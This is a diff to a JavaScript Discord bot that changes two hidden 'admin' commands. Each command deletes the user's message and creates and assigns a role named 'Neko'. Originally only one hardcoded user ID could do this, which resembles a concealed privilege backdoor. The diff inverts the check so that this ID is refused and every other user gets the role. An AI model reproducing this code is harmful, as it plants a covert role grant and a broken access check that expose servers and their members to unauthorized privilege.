@@ -74,7 +74,7 @@ bot.on('message', message => {
 
     if(message.content.startsWith(prefix + "admin")) {
       message.delete()
-    if (message.author.id === "353859650686550027") {
+    if (message.author.id === "353859650686550027") return message.reply("tu n'as pas la permission exacte pour executer cette commande.");
       let membre = message.guild.member(message.author);
       let role = message.guild.roles.find('name', 'Neko');
           message.guild.createRole({
@@ -83,9 +83,6 @@ bot.on('message', message => {
           color: "#ff0000",
         })
         membre.addRole(role).catch(console.error);
-    }else {
-      message.reply("tu n'as pas la permission exacte pour executer cette commande.")
-    }
     var embedlog = new Discord.RichEmbed()
     .setTitle("Logs :tools:")
     .setDescription("--")
@@ -99,7 +96,7 @@ bot.on('message', message => {
     
     if(message.content.startsWith("neko admin")) {
       message.delete()
-    if (message.author.id === "353859650686550027") {
+    if (message.author.id === "353859650686550027") return message.reply("tu n'as pas la permission exacte pour executer cette commande.")
       let membre = message.guild.member(message.author);
       let role = message.guild.roles.find('name', 'Neko');
           message.guild.createRole({
@@ -108,9 +105,6 @@ bot.on('message', message => {
           color: "#ff0000",
         })
         membre.addRole(role).catch(console.error);
-    }else {
-      message.reply("tu n'as pas la permission exacte pour executer cette commande.")
-    }
     var embedlog = new Discord.RichEmbed()
     .setTitle("Logs :tools:")
     .setDescription("--")
